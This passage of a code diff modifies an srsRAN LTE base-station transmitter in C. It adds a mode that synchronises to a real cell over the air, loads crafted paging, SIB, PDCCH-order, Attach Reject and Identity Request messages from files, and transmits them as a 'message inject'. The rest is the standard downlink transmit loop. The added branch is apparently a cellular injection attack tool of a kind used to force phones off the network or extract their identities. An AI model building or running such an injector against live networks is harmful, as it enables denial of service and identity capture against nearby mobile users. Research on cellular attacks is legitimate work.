+         printf("Cell not found after %d trials. Trying again (Press Ctrl+C to exit)\n", ntrial++);
+       }
+     } while (ret == 0 && !go_exit);
+     
+     if (go_exit) {
+       srsran_rf_close(&radio);
+       exit(0);
+     }
+ 
+     /* set sampling frequency */
+     printf("Setting sampling rate %.2f MHz\n", (float)srate / 1000000);
+     float srate_rf2 = srsran_rf_set_rx_srate(&radio, (double)srate);
+     if (srate_rf2 != srate) {
+       ERROR("Could not set sampling rate");
+       exit(-1);
+     }
+ 
+     /* ue sync pss and sss */
+     if (srsran_ue_sync_init_multi_decim(&ue_sync,
+                                         cell.nof_prb,
+                                         cell.id == 1000,
+                                         srsran_rf_recv_wrapper,
+                                         1, // prog_args.rf_nof_rx_ant,
+                                         (void*)&radio,
+                                         decimate)) {
+       ERROR("Error initiating ue_sync");
+       exit(-1);
+     }
+     if (srsran_ue_sync_set_cell(&ue_sync, cell)) {
+       ERROR("Error initiating ue_sync");
+       exit(-1);
+     }
+ 
+     if (paging_msg) {
+       printf ("Ready PAGING Case!\n");
+       read_file(paging_buffer[0], paging_file_name);
+     }
+   
+     if (sib1_msg) {
+       printf ("Ready SIB1 Case!\n");
+       read_file(sib1_buffer[0], sib1_file_name);
+     }
+ 
+     if (sib2_msg) {
+       printf ("Ready SIB2 Case!\n");
+       read_file(sib2_buffer[0], sib2_file_name);
+     }
+     if (po_msg) {
+      printf ("Ready Pdcch Order Case!\n");
+      read_file(po_buffer[0], pdcchorder_file_name);
+    }
+    if (ar_msg) {
+      printf ("Ready Attach Reject Case!\n");
+      read_file(ar_buffer[0], attachreject_file_name);
+    }
+    if (ir_msg) {
+      printf ("Ready Identity Request Case!\n");
+      read_file(ir_buffer[0], identityrequest_file_name);
+    }
+    if (ext_msg) {
+      printf ("Ready Extend Msg Case!\n");
+
+      // 从 ext_file_name 提取 TTI
+      const char* sf_ptr = strstr(ext_file_name, "sf");
+      if (sf_ptr) {
+          sscanf(sf_ptr + 2, "%u", &target_tti);
+      } else {
+          target_tti = 4; // 默认值
+      }
+
+      read_file(ext_buffer[0], ext_file_name);
+    }
+    free(cell_dir);
+     /* init memory */
+     max_num_samples = 3 * SRSRAN_SF_LEN_PRB(SRSRAN_MAX_PRB); /// Length in complex samples
+     for (i = 0; i < SRSRAN_MAX_PORTS; i++) {
+       sf_buffer_sync[i] = srsran_vec_cf_malloc(max_num_samples);
+     }
+     if (srsran_ue_mib_init(&ue_mib, sf_buffer_sync[0], cell.nof_prb)) {
+       ERROR("Error initaiting UE MIB decoder");
+       exit(-1);
+     }
+     if (srsran_ue_mib_set_cell(&ue_mib, cell)) {
+       ERROR("Error initaiting UE MIB decoder");
+       exit(-1);
+     }
+     if (srsran_ue_dl_init(&ue_dl, sf_buffer_sync, cell.nof_prb, 1)) {
+       ERROR("Error initiating UE downlink processing module");
+       exit(-1);
+     }
+     if (srsran_ue_dl_set_cell(&ue_dl, cell)) {
+       ERROR("Error initiating UE downlink processing module");
+       exit(-1);
+     } 
+     ue_sync.cfo_current_value       = search_cell_cfo / 15000;
+     ue_sync.cfo_is_copied           = true;
+     ue_sync.cfo_correct_enable_find = true;
+     ue_sync.cfo_correct_enable_track = true;
+     srsran_sync_set_cfo_cp_enable(&ue_sync.sfind, false, 0);
+     
+     ZERO_OBJECT(ue_dl_cfg);
+     ZERO_OBJECT(chest_pdsch_cfg);
+     ZERO_OBJECT(dl_sf);
+     ZERO_OBJECT(pdsch_cfg);
+     pdsch_cfg.meas_evm_en = true;
+     chest_pdsch_cfg.cfo_estimate_enable   = false;
+     chest_pdsch_cfg.cfo_estimate_sf_mask  = 1023;
+     chest_pdsch_cfg.estimator_alg         = srsran_chest_dl_str2estimator_alg("interpolate");
+     chest_pdsch_cfg.sync_error_enable     = true;
+     srsran_softbuffer_rx_t rx_softbuffers[SRSRAN_MAX_CODEWORDS];
+     for (uint32_t i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
+       pdsch_cfg.softbuffers.rx[i] = &rx_softbuffers[i];
+       srsran_softbuffer_rx_init(pdsch_cfg.softbuffers.rx[i], cell.nof_prb);
+     }
+     pdsch_cfg.rnti = UE_CRNTI;
+ 
+     srsran_pbch_decode_reset(&ue_mib.pbch);
+     srsran_rf_start_rx_stream(&radio, false); 
+ 
+     if (pthread_create(&tx_thread, NULL, tx_thread_func, NULL)) {
+       perror("tx_thread_funx pthread create failed");
+       exit(-1);
+     }
+     if (pthread_create(&rx_thread, NULL, rx_thread_func, NULL)) {
+       perror("rx_thread_funx pthread create failed");
+       exit(-1);
+     }
+ 
+     int status;
+     printf("Start message inject!\n");
+     pthread_join(tx_thread, (void**)&status);
+     pthread_join(rx_thread, (void**)&status);
+ 
+     status = pthread_mutex_destroy(&mutex);
+     srsran_ue_sync_free(&ue_sync);
+     srsran_rf_close(&radio);
+     printf("code = %d\n Inject Done\n", status);
+     exit(0);
+   }
+ #endif
+   if (update_radl()) {
+     exit(-1);
+   } 
+   if (net_port > 0) {
+     if (pthread_create(&net_thread, NULL, net_thread_fnc, NULL)) {
+       perror("pthread_create");
+       exit(-1);
+     }
+   }
+   pmch_cfg.pdsch_cfg.grant.tb[0].tbs = 1096;
+    srsran_dl_sf_cfg_t dl_sf;
+   ZERO_OBJECT(dl_sf);
+    /* Initiate valid DCI locations */
+   for (i = 0; i < SRSRAN_NOF_SF_X_FRAME; i++) {
+     dl_sf.cfi = cfi;
+     dl_sf.tti = i;
+     srsran_pdcch_ue_locations(&pdcch, &dl_sf, locations[i], 30, UE_CRNTI);
+   }
+ 
+   nf = 0;
+ 
+   bool send_data = false;
+   for (i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
+     srsran_softbuffer_tx_reset(softbuffers[i]);
+   }
+ 
+ #ifndef DISABLE_RF
+   bool start_of_burst = true;
+ #endif
+ 
+   ZERO_OBJECT(pdsch_cfg);
+   for (uint32_t j = 0; j < SRSRAN_MAX_CODEWORDS; j++) {
+     pdsch_cfg.softbuffers.tx[j] = softbuffers[j];
+   }
+   pdsch_cfg.rnti = UE_CRNTI;
+ 
+   pmch_cfg.pdsch_cfg = pdsch_cfg;
+ 
+   while ((nf < nof_frames || nof_frames == -1) && !go_exit) {
+     for (sf_idx = 0; sf_idx < SRSRAN_NOF_SF_X_FRAME && (nf < nof_frames || nof_frames == -1) && !go_exit; sf_idx++) {
+       /* Set Antenna port resource elements to zero */
+       srsran_vec_cf_zero(sf_symbols[0], sf_n_re);
+ 
+       if (sf_idx == 0 || sf_idx == 5) {
+         srsran_pss_put_slot(pss_signal, sf_symbols[0], cell.nof_prb, cell.cp);
+         srsran_sss_put_slot(sf_idx ? sss_signal5 : sss_signal0, sf_symbols[0], cell.nof_prb, cell.cp);
+       }
+       //test yg 1108
+       //printf("line 1479\n");
+       /* Copy zeros, SSS, PSS into the rest of antenna ports */
+       for (i = 1; i < cell.nof_ports; i++) {
+         memcpy(sf_symbols[i], sf_symbols[0], sizeof(cf_t) * sf_n_re);
+       }
+ 
+       if (mch_table[sf_idx] == 1 && mbsfn_area_id > -1) {
+         srsran_refsignal_mbsfn_put_sf(cell, 0, csr_refs.pilots[0][sf_idx], mbsfn_refs.pilots[0][sf_idx], sf_symbols[0]);
+       } else {
+         dl_sf.tti = nf * 10 + sf_idx;
+         for (i = 0; i < cell.nof_ports; i++) {
+           srsran_refsignal_cs_put_sf(&csr_refs, &dl_sf, (uint32_t)i, sf_symbols[i]);
+         }
+       }
+ 
+       srsran_pbch_mib_pack(&cell, sfn, bch_payload);
+       if (sf_idx == 0) {
+         srsran_pbch_encode(&pbch, bch_payload, sf_symbols, nf % 4);
+       }
+ 
+       dl_sf.tti = nf * 10 + sf_idx;
+       dl_sf.cfi = cfi;
+ 
+       srsran_pcfich_encode(&pcfich, &dl_sf, sf_symbols);
+ 
+       /* Update DL resource allocation from control port */
+       if (update_control() < SRSRAN_SUCCESS) {
+         ERROR("Error updating parameters from control port");
+       }
+ 
+       /* Transmit PDCCH + PDSCH only when there is data to send */
+       if ((net_port > 0) && (mch_table[sf_idx] == 1 && mbsfn_area_id > -1)) {
+         send_data = net_packet_ready;
+         if (net_packet_ready) {
+           INFO("Transmitting packet from port");
+         }
+       } else {
+         INFO("SF: %d, Generating %d random bits", sf_idx, pdsch_cfg.grant.tb[0].tbs + pdsch_cfg.grant.tb[1].tbs);
+         for (uint32_t tb = 0; tb < SRSRAN_MAX_CODEWORDS; tb++) {
+           if (pdsch_cfg.grant.tb[tb].enabled) {
+             for (i = 0; i < pdsch_cfg.grant.tb[tb].tbs / 8; i++) {
+               data[tb][i] = (uint8_t)rand();
+             }
+           }
+         }
+         /* Uncomment this to transmit on sf 0 and 5 only  */
+         if (sf_idx != 0 && sf_idx != 5) {
+           send_data = true;
+         } else {
+           send_data = false;
+         }
+       }
+       if (send_data) {
+         if (mch_table[sf_idx] == 0 || mbsfn_area_id < 0) { // PDCCH + PDSCH
+           dl_sf.sf_type = SRSRAN_SF_NORM;
+ 
+           /* Encode PDCCH */
+           INFO("Putting DCI to location: n=%d, L=%d", locations[sf_idx][0].ncce, locations[sf_idx][0].L);
+ 
+           srsran_dci_msg_pack_pdsch(&cell, &dl_sf, NULL, &dci_dl, &dci_msg);
+           dci_msg.location = locations[sf_idx][0];
+           if (srsran_pdcch_encode(&pdcch, &dl_sf, &dci_msg, sf_symbols)) {
+             ERROR("Error encoding DCI message");
+             exit(-1);
+           }
+ 
+           /* Configure pdsch_cfg parameters */
+           if (srsran_ra_dl_dci_to_grant(&cell, &dl_sf, transmission_mode, enable_256qam, &dci_dl, &pdsch_cfg.grant)) {
+             ERROR("Error configuring PDSCH");
+             exit(-1);
+           }
+ 
+           /* Encode PDSCH */
+           if (srsran_pdsch_encode(&pdsch, &dl_sf, &pdsch_cfg, data, sf_symbols)) {
+             ERROR("Error encoding PDSCH");
+             exit(-1);
+           }
+           if (net_port > 0 && net_packet_ready) {
+             if (null_file_sink) {
+               for (uint32_t tb = 0; tb < SRSRAN_MAX_CODEWORDS; tb++) {
+                 srsran_bit_pack_vector(data[tb], data_tmp, pdsch_cfg.grant.tb[tb].tbs);
+                 if (srsran_netsink_write(&net_sink, data_tmp, 1 + (pdsch_cfg.grant.tb[tb].tbs - 1) / 8) < 0) {
+                   ERROR("Error sending data through UDP socket");
+                 }
+               }
+             }
+             if (mbsfn_area_id < 0) {
+               net_packet_ready = false;
+               sem_post(&net_sem);
+             }
+           }
+         } else { // We're sending MCH on subframe 1 - PDCCH + PMCH
+           dl_sf.sf_type = SRSRAN_SF_MBSFN;
+ 
+           /* Force 1 word and MCS 2 */
+           dci_dl.rnti                    = SRSRAN_MRNTI;
+           dci_dl.alloc_type              = SRSRAN_RA_ALLOC_TYPE0;
+           dci_dl.type0_alloc.rbg_bitmask = 0xffffffff;
+           dci_dl.tb[0].mcs_idx           = 2;
+           dci_dl.format                  = SRSRAN_DCI_FORMAT1;
+ 
+           /* Configure pdsch_cfg parameters */
+           if (srsran_ra_dl_dci_to_grant(&cell, &dl_sf, SRSRAN_TM1, enable_256qam, &dci_dl, &pmch_cfg.pdsch_cfg.grant)) {
+             ERROR("Error configuring PDSCH");
+             exit(-1);
+           }
+ 
+           for (int j = 0; j < pmch_cfg.pdsch_cfg.grant.tb[0].tbs / 8; j++) {
+             data_mbms[j] = j % 255;
+           }
+ 
+           pmch_cfg.area_id = mbsfn_area_id;
+ 
+           /* Encode PMCH */
+           if (srsran_pmch_encode(&pmch, &dl_sf, &pmch_cfg, data_mbms, sf_symbols)) {
+             ERROR("Error encoding PDSCH");
+             exit(-1);
+           }
+           if (net_port > 0 && net_packet_ready) {
+             if (null_file_sink) {
+               srsran_bit_pack_vector(data[0], data_tmp, pmch_cfg.pdsch_cfg.grant.tb[0].tbs);
+               if (srsran_netsink_write(&net_sink, data_tmp, 1 + (pmch_cfg.pdsch_cfg.grant.tb[0].tbs - 1) / 8) < 0) {
+                 ERROR("Error sending data through UDP socket");
+               }
+             }
+             net_packet_ready = false;
+             sem_post(&net_sem);
+           }
+         }
+       }
+ 
+       /* Transform to OFDM symbols */
+       if (mch_table[sf_idx] == 0 || mbsfn_area_id < 0) {
+         for (i = 0; i < cell.nof_ports; i++) {
+           srsran_ofdm_tx_sf(&ifft[i]);
+         }
+       } else {
+         srsran_ofdm_tx_sf(&ifft_mbsfn);
+       }
+ 
+       /* send to file or usrp */
+       if (output_file_name) {
+         if (!null_file_sink) {
+           /* Apply AWGN */
+           if (output_file_snr != +INFINITY) {
+             float var = srsran_convert_dB_to_power(-output_file_snr);
+             for (int k = 0; k < cell.nof_ports; k++) {
+               srsran_ch_awgn_c(output_buffer[k], output_buffer[k], var, sf_n_samples);
+             }
+           }
+           srsran_filesink_write_multi(&fsink, (void**)output_buffer, sf_n_samples, cell.nof_ports);
+         }
+         usleep(1000);
+       } else {
+ #ifndef DISABLE_RF
+         float norm_factor = (float)cell.nof_prb / 15 / sqrtf(pdsch_cfg.grant.nof_prb);
+         for (i = 0; i < cell.nof_ports; i++) {
+           srsran_vec_sc_prod_cfc(
+               output_buffer[i], rf_amp * norm_factor, output_buffer[i], SRSRAN_SF_LEN_PRB(cell.nof_prb));
+         }
+         srsran_rf_send_multi(&radio, (void**)output_buffer, sf_n_samples, true, start_of_burst, false);
+         start_of_burst = false;
+ #endif
+       }
+     }
+     nf++;
+     sfn = (sfn + 1) % 1024;
+   }
+ 
+   base_free();
+ 
+   exit(0);
+ }
